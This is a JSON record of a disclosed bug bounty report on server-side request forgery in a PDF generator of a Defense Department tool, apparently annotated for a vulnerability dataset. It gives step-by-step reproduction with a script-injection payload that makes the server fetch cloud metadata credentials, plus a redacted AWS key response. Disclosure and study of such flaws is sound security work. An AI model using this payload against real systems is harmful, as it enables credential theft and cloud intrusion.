{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "codeprivate ",
    "title": "SSRF in Functional Administrative Support Tool pdf generator (\u2588\u2588\u2588\u2588) [HtUS]",
    "content": "\nSummary:\nI found that it is possible to inject a javascript payload during the PDF form creation process, which is then executed by the checklist application server.\nVulnerable Software: Functional Administrative Support Tool (FAST) v1.0\nIntro:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAdministrative clerks create a dynamic action items by guiding a\u2588\u2588\u2588 through targeted questions designed to draw out required administrative actions that are required and trigger of additional processes that need to be completed.\nAfter completing the question and answer process ( point 3. Get Action Items ) the application offers 2 options: Send the report by Email or print (See PDF).\nWhen the user clicks on (View PDF) they are redirected to the URL:\u2588\u2588\u2588\u2588\u2588\u2588\u2588/print/checklist/fast_session_XXXXXX.pdf . This is where the user will have access to his PDF form generated dynamically by the\u2588\u2588\u2588 system.\nnote: XXXXXX is the \"session\" assigned by the system to identify a form.\nSteps To Reproduce:\nGo to\u2588\u2588\u2588/ and select \"BEGIN NEW SESSION\", enter a MCC code Ex. \"h99\" and SUBMIT\nwith burp suite on, select a process, and fill in the data randomly up to point 3. (EDIPI code is a 10 chars long number. Ex. 0123456789) - click CONTINUE\nin point 3, (Get Action Items) click on PRINT (VIEW PDF) - A window will open with the dynamically generated PDF exposing the data that we complete.\nobserve in burp suite the last request made to /api/save/ proceed to right click and send to \"Repeater\"\nmodify value \"name\" of the json object \"globalInfo\" by the payload:\n</script><script>document.write('<iframe src=\\\"http://\u2588\u2588\u2588/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\\\" width=1000px height=1000px>')</script>\nand click Send request. If everything went well, the server responds \"status ok\"\nRefresh form URL. Ex.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/print/checklist/fast_session_XXXXXX.pdf\nfor this PoC. AWS secretkeys were accessed:\n{ \"Code\" : \"Success\", \"LastUpdated\" : \"2022-07-06T02:57:53Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"\u2588\u2588\u2588\", \"SecretAccessKey\" : \"\u2588\u2588\u2588\u2588\", \"Token\" :\"\u2588\u2588\u2588\u2588\u2588\u2588\", \"Expiration\" : \"2022-07-06T09:04:49Z\"}\nSupporting Material/References:\nhttps://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\nhttps://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent\nhttps://hackerone.com/reports/508459\nhttps://hackerone.com/reports/53088\nImpact\nAn attacker can inject malicious javascript payloads in the PDF generation process and executed by the checklist application server. An attacker could use this to Steal credentials or other sensitive information from \u2588\u2588\u2588\u2588 AWS Instance.\n\n",
    "severity": [
        9.4,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1663203600,
    "report_url": "https://hackerone.com/reports/1628209",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Go to \u2588\u2588\u2588/ and select 'BEGIN NEW SESSION', enter a MCC code Ex. 'h99' and SUBMIT"
        ],
        [
            2,
            "With Burp Suite on, select a process, and fill in the data randomly up to point 3 (EDIPI code is a 10 chars long number. Ex. 0123456789) - click CONTINUE"
        ],
        [
            3,
            "In point 3, (Get Action Items) click on PRINT (VIEW PDF) - A window will open with the dynamically generated PDF exposing the data that we complete."
        ],
        [
            4,
            "Observe in Burp Suite the last request made to /api/save/, proceed to right click and send to 'Repeater'"
        ],
        [
            5,
            "Modify value 'name' of the json object 'globalInfo' by the payload: </script><script>document.write('<iframe src=\"http://\u2588\u2588\u2588/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\" width=1000px height=1000px>')</script> and click Send request. If everything went well, the server responds 'status ok'"
        ],
        [
            6,
            "Refresh form URL. Ex. \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/print/checklist/fast_session_XXXXXX.pdf"
        ]
    ],
    "vuln_description": "The vulnerability allows injecting a JavaScript payload during the PDF form creation process, which is then executed by the checklist application server. This can lead to Server-Side Request Forgery (SSRF), enabling an attacker to access sensitive information such as AWS secret keys from the server's metadata.",
    "reason": "The attack involves multiple steps including intercepting and modifying a request with a JavaScript payload, but the interaction between the components is straightforward once the PDF generation endpoint is identified. The vulnerability leverages a common SSRF vector, making it less novel.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "508459"
}